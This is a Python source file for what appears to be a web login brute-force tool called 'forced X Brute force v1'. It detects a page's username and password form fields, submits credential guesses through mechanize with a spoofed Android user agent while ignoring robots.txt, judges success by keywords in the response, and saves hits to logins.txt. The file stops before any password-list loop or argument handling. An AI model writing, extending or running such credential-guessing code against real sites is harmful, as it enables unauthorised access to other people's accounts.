import argparse
import mechanize
import time
import sys
import random
import requests
import user_agent
from bs4 import BeautifulSoup as bs
user_=user_agent.generate_user_agent(os=('android'))
W = '\33[0m'
R = '\33[1;31m'
G = '\033[1;32m'
O = '\33[1;33m'
B = '\33[1;34m'
P = '\33[1;35m'
C = '\33[1;36m'
#GR = '\33[1;37m'
GR="\033[40m\033[1;30m"
def ban():
	print(f'''{R}
    ____                         __   _  __
   / __/___  _____________  ____/ /  | |/ /
  / /_/ __ \/ ___/ ___/ _ \/ __  /   |   / 
 / __/ /_/ / /  / /__/  __/ /_/ /   /   |  
/_/  \____/_/   \___/\___/\__,_/   /_/|_| 

{W}[{R}*{W}]{G} forced X {R}Brute force {P}v1\033[40m\033[1;30m Bay issam iso
{W}''')
list=[]
error=f'{W}[{R} ! {W}]{R} Error{GR} '
done=f'{W}[{P} + {W}]{G} '
ty=f'{W}[{R} *{W} ]{W} '
def ssvv(url,username,password):
	txt=f'username :[ {username} ] password :[ {password} ] from : {url}'
	file=open('logins.txt','a')
	file.write(txt+'\n')
	file.close()
def getform(url):
	list=[]
	try:
		req=requests.get(url)
		soup=bs(req.text,'html.parser').find_all('input')
		for aa in soup:
			list.append(aa['name'])
		print(done+W+'found input form '+GR+'{ '+list[0]+' '+list[1]+' }')
		return list[0],list[1]
	except:
		print(error+'failed get input form ')
		sys.exit()
def login(url,username,password,formuser,formpass,keyfalse,keytrue):
	ban()
	if formuser == 0 and formpass == 0 or formuser == "0" and formpass == "0":
		formuser,formpass=getform(url)
	browser=mechanize.Browser()
	browser.set_handle_robots(False)
	browser.addheaders=[('User-Agent',user_)]
	try:
		browser.open(url)
	except:
		print(error+'open urls ')
		sys.exit()
	try:
		browser.select_form(nr=0)
	except:
		print(error+'select form')
		sys.exit()
	browser.select_form(nr=0)
	try:
		browser.form[formuser]=username
		browser.form[formpass]=password
	except:
		print(error+f'select ( {formuser} {formpass} )')
		sys.exit()
	browser.form[formuser]=username
	browser.form[formpass]=password
	browser.submit()
	ml=browser.response().read()
	html=str(ml)
	if keyfalse in html:
		print(ty+f'username [ {username} ] password [ {password} ]{GR} stauts {R} failed')
	if keyfalse not in html:
		print(ty+G+'Key False not in web')
		print(done+'username : '+username)
		print(done+'password : '+password)
		ssvv(url,username,password)
	if keytrue in html:
		print(ty+G+'from key true')
		print(done+'username : '+username)
		print(done+'password : '+password)
		ssvv(url,username,password)
	else:
		pass
		
